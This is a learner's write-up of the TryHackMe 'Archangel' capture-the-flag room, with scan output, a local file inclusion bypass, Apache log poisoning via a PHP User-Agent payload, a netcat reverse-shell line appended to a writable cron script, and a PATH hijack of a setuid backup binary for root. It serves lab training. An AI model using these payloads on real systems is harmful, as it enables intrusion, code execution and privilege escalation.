@@ -1,0 +1,569 @@
+Name: Archangel
+Date: 10/02/2022
+Difficulty: Easy
+Description: Boot2root, Web exploitation, Privilege escalation, LFI
+Better Description: 
+Goals: LFI room in Jr Pentest Path was rough, try and try and try again... AGAIN!
+Learnt: Logs logs logs logs logs, the power of curl
+
+root@ip-10-10-150-89:~# nmap -sC -sV -O -T 4 -p- 10.10.145.250
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-20 10:42 GMT
+Warning: 10.10.145.250 giving up on port because retransmission cap hit (6).
+Nmap scan report for ip-10-10-145-250.eu-west-1.compute.internal (10.10.145.250)
+Host is up (0.00063s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
+|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
+|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (EdDSA)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Wavefire
+MAC Address: 02:0E:0F:04:58:F1 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=1/20%OT=22%CT=1%CU=33326%PV=Y%DS=1%DC=D%G=Y%M=020E0F%T
+OS:M=61E942D8%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=2%ISR=10A%TI=Z%CI=Z%TS=A
+OS:)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
+OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
+OS:WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=
+OS:F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
+OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
+OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
+OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
+OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1622.52 seconds
+
+
+root@ip-10-10-150-89:~# nikto -h 10.10.145.250 
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.145.250
++ Target Hostname:    ip-10-10-145-250.eu-west-1.compute.internal
++ Target Port:        80
++ Start Time:         2022-01-20 10:42:08 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x4af4 0x5b44cd4222270 
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
++ OSVDB-3092: /pages/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2022-01-20 10:44:27 (GMT0) (139 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+root@ip-10-10-150-89:~# gobuster dir -u http://10.10.145.250 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.145.250
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/20 10:39:55 Starting gobuster
+===============================================================
+/images (Status: 301)
+/pages (Status: 301)
+/flags (Status: 301)
+/layout (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2022/01/20 10:44:13 Finished
+===============================================================
+root@ip-10-10-150-89:~# gobuster dir -u http://10.10.145.250 -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.145.250
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/20 10:59:03 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/flags (Status: 301)                                                    # FUCKING RICK ROLL
+/images (Status: 301)
+/index.html (Status: 200)
+/layout (Status: 301)
+/pages (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2022/01/20 10:59:04 Finished
+===============================================================
+root@ip-10-10-150-89:~# gobuster dir -u http://10.10.145.250/flags -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.145.250/flags
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/20 11:16:42 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+===============================================================
+2022/01/20 11:16:43 Finished
+===============================================================
+root@ip-10-10-150-89:~# gobuster dir -u http://10.10.145.250/pages -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.145.250/pages
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/20 11:16:51 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/index.html (Status: 200)
+===============================================================
+2022/01/20 11:16:52 Finished
+===============================================================
+root@ip-10-10-150-89:~# gobuster dir -u http://10.10.145.250/images -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.145.250/images
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/20 11:17:04 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/demo (Status: 301)
+/index.html (Status: 200)
+===============================================================
+2022/01/20 11:17:05 Finished
+===============================================================
+root@ip-10-10-150-89:~# gobuster dir -u http://10.10.145.250/demo -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.145.250/demo
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/20 11:17:11 Starting gobuster
+===============================================================
+===============================================================
+2022/01/20 11:17:11 Finished
+===============================================================
+
+Find a different hostname
+
+mafialive.thm
+
+Find flag 1
+
+vim /etc/hosts
+#add line
+$IP     mafialive.thm
+
+# leave vim with command saving and quitting
+:wq 
+# Then to get flag 1:
+root@ip-10-10-103-90:~# curl -i mafialive.thm
+HTTP/1.1 200 OK
+Date: Wed, 02 Feb 2022 17:56:55 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Last-Modified: Thu, 19 Nov 2020 14:01:00 GMT
+ETag: "3b-5b476286775bf"
+Accept-Ranges: bytes
+Content-Length: 59
+Content-Type: text/html
+
+<h1>UNDER DEVELOPMENT</h1>
+flagishere!
+
+Look for a page under development
+
+
+root@ip-10-10-103-90:~# nikto -h http://mafialive.thm
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.100.186
++ Target Hostname:    mafialive.thm
++ Target Port:        80
++ Start Time:         2022-02-02 18:00:26 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x3b 0x5b476286775bf 
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ File/dir '/test.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 1 entry which should be manually viewed.
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
++ OSVDB-3233: /icons/README: Apache default file found.
++ OSVDB-3092: /test.php: This might be interesting...
++ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2022-02-02 18:00:41 (GMT0) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+root@ip-10-10-103-90:~# gobuster dir -u http://mafialive.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt php
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://mafialive.thm
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     txt
+[+] Timeout:        10s
+===============================================================
+2022/02/02 18:00:05 Starting gobuster
+===============================================================
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2022/02/02 18:00:56 Finished
+===============================================================
+
+GOTO robots.txt
+
+/test.php
+
+<html>
+
+<head>
+    <title>INCLUDE</title>
+    <h1>Test Page. Not to be Deployed</h1>
+ 
+    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+        Control is an illusion    </div>
+</body>
+
+</html>
+
+http://mafialive.thm/test.php?view=/etc/passwd
+Sorry, Thats not allowed 
+
+Find flag 2
+
+Hint look at the code:
+If you press the button you get "view=" this variable that then using the:
+ </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php">
+
+As pointed out by 
+https://systemweakness.com/archangel-tryhackme-436ca1127513
+->https://highon.coffee/blog/lfi-cheat-sheet/#php-wrapper-phpfilter
+We insert this base64 filter look at the resource
+php://filter/convert.base64-encode/resource=
+
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
+                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+It will return:
+PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg== 
+root@ip-10-10-103-90:~# echo "PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==" | base64 -d
+<?php echo 'Control is an illusion'; ?>
+
+You can also do the same to the test.php. It is fortunately in the same directory
+
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing//test.php
+
+root@ip-10-10-103-90:~# echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d
+
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>INCLUDE</title>
+    <h1>Test Page. Not to be Deployed</h1>
+ 
+    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+        <?php
+
+            //FLAG: thm{} 
+
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+            if(isset($_GET["view"])){
+            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
+                include $_GET['view'];
+            }else{
+
+                echo 'Sorry, Thats not allowed';
+            }
+        }
+        ?>
+    </div>
+</body>
+
+</html>
+
+
+It is filtering ../../
+
+I tried ....//....//....// but did not work
+
+root@ip-10-10-103-90:~# curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/....//....//....//..../etc/passwd
+
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>INCLUDE</title>
+    <h1>Test Page. Not to be Deployed</h1>
+ 
+    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+            </div>
+</body>
+
+</html>
+
+
+root@ip-10-10-103-90:~# curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../etc/passwd
+
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>INCLUDE</title>
+    <h1>Test Page. Not to be Deployed</h1>
+ 
+    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+        root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
+    </div>
+</body>
+
+</html>
+
+
+Get a shell and find the user flag reviewing writeups as my web hacking is still not great, and my lack of exeperience with this area of the directory tree or server setting up. Link to blog:
+INSERT LINK 
+
+https://systemweakness.com/archangel-tryhackme-436ca1127513
+
+view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
+
+But because we can recieve this page either via browser or with the wonders of curl:
+
+
+root@ip-10-10-36-188:~# curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
+
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>INCLUDE</title>
+    <h1>Test Page. Not to be Deployed</h1>
+ 
+    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+        
+10.10.36.188 - - [10/Feb/2022:22:35:05 +0530] "PUT /test.php?view=/var/www/html/development_testing/..//..//..//../tmp/f.sh HTTP/1.1" 200 483 "-" "curl/7.58.0"
+10.10.36.188 - - [10/Feb/2022:22:35:16 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//../tmp/f.sh HTTP/1.1" 200 458 "-" "curl/7.58.0"
+10.10.36.188 - - [10/Feb/2022:22:35:31 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//../etc/hosts HTTP/1.1" 200 690 "-" "curl/7.58.0"
+10.10.36.188 - - [10/Feb/2022:22:38:27 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache/access.log HTTP/1.1" 200 458 "-" "curl/7.58.0"
+10.10.36.188 - - [10/Feb/2022:22:38:36 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache/access.log HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0"
+10.10.36.188 - - [10/Feb/2022:22:38:36 +0530] "GET /favicon.ico HTTP/1.1" 404 491 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0"
+10.10.36.188 - - [10/Feb/2022:22:38:38 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1" 200 485 "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache/access.log" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0"
+10.10.36.188 - - [10/Feb/2022:22:38:57 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache/access.log HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0"
+10.10.36.188 - - [10/Feb/2022:22:39:12 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache/access.log HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0"
+10.10.36.188 - - [10/Feb/2022:22:39:33 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log HTTP/1.1" 200 762 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0"
+    </div>
+</body>
+
+</html>
+
+We can perform we can perform log poisoning which uses the log as readable section for the very system to read our injected code and execute it. This covered in many of thee lfi rooms as well as the log4j rooms, highly reccomended to practice and understand the technique. Because from our nmap scan we know that the server is a linux server and apache2 is php based we can use tools to inject a php inject of system commands to gain a foothold on the system.
+
+<?php system($_GET['cmd'];?> # This code needs to replace the user-agent of the web request.
+
+
+https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-2-rce
+
+I am going to try with curl instead of burp over my time learning anything web related, mastering curl seems to be more powerful than using burp for everything. You can use it in scripts, its free and basicaally what burp uses anyway. Not to say Burp is bad. It very very useful if like my you did not start with a web based background to see a request and a response come in and go in GUI form.
+
+curl -A "<?php system($_GET['cmd'];?>" http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=whoami
+
+Unfortunately this does not work and you have to restart the box. :( Remember to test things in your own time on your own machines. Well I just did the same with Burp repeater. 
+
+To further understand this and other issues
+from 
+https://m4t3sz.gitlab.io/bsc/writeup/thm/archangel/
+
+We have the possible locations!
+
+    /var/log/apache/access.log
+    /var/log/apache2/access.log
+    /var/log/httpd/access.log
+    /var/log/httpd/access_log
+    /var/log/httpd-access.log
+
+There are some configfiles too which can leak the location of our target logfile:
+
+    /etc/apache2/apache2.conf
+    /etc/httpd/conf/httpd.conf
+
+Also this writeup had:
+WITH CURL!
+
+$ curl 'http://mXXXXXXXe.thm/tXXX.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log' -H "User-Agent: asd <?php system('id'); ?> fgh"
+
+
+Amazing THANK YOU: https://github.com/matesz44/
+
+www-data@ubuntu:/tmp$ ls -l /etc/hosts
+-rw-r--r-- 1 root root 232 Nov 17  2020 /etc/hosts
+www-data@ubuntu:/tmp$ ls -l /etc/passwd
+-rw-r--r-- 1 root root 1359 Nov 18  2020 /etc/passwd
+www-data@ubuntu:/tmp$ ls -l /etc/shadow 
+-rw-r----- 1 root shadow 913 Nov 18  2020 /etc/shadow
+www-data@ubuntu:/tmp$ ls -l /etc/exports
+ls: cannot access '/etc/exports': No such file or directory
+www-data@ubuntu:/tmp$ cat /etc/crontab  
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/1 *   * * *   archangel /opt/helloworld.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+www-data@ubuntu:/tmp$ sudo -l -l
+[sudo] password for www-data: 
+
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+opt/helloworld.sh
+
+www-data@ubuntu:/opt$ ls -la
+total 16
+drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
+drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
+drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
+-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
+
+remove the the rest the script with vi the offending line with "dd", ":wq" to save&quit
+
+SINGLE QUOTES!
+https://stackoverflow.com/questions/6697753/difference-between-single-and-double-quotes-in-bash#6697781
+
+Tried with double quotes
+
+www-data@ubuntu:/opt$ echo 'rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.36.188 5656 >/tmp/g' >> /opt/helloworld.sh
+
+root@ip-10-10-36-188:~# nc -lvnp 5656
+Listening on [0.0.0.0] (family 0, port 5656)
+Connection from 10.10.104.63 43926 received!
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+myfiles
+secret
+user.txt
+$ id
+uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)
+archangel@ubuntu:~/secret$ ls -la
+total 32
+drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .
+drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
+-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
+-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt
+
+archangel@ubuntu:~/secret$ file backup 
+backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped
+
+root@ip-10-10-36-188:~# wget http://10.10.104.63:3434/backup
+
+radare2 it:
+[0x7f59c2db0090]> afl
+0x55c3e519c000    7 348  -> 349  sym.imp.__libc_start_main
+0x55c3e519d03a    2 5    -> 18   sym.imp.setgid
+0x55c3e519d04a    2 5    -> 18   sym.imp.setuid
+0x55c3e519d0d0    3 33           sym.deregister_tm_clones
+0x55c3e519d100    3 50           sym.register_tm_clones
+
+
+strings
+*important strings* 
+cp /home/user/archangel/myfiles/* /opt/backupfiles
+
+It copies all the files in myfiles directory to /opt/backupfiles
+
+We can do path injection
+
+archangel@ubuntu:/dev/shm$ mkdir badapple;cd badapple
+archangel@ubuntu:/dev/shm/badapple$ echo 'bash -p' > cp
+archangel@ubuntu:/dev/shm/badapple$ chmod +x cp
+archangel@ubuntu:/dev/shm/badapple$ export PATH="/dev/shm/badapple/:$PATH
+archangel@ubuntu:/dev/shm/badapple$ /home/archangel/secret/backup
+root@ubuntu:/dev/shm/badapple# id
+uid=0(root) gid=0(root) groups=0(root),1001(archangel)
+cat /root/root.txt
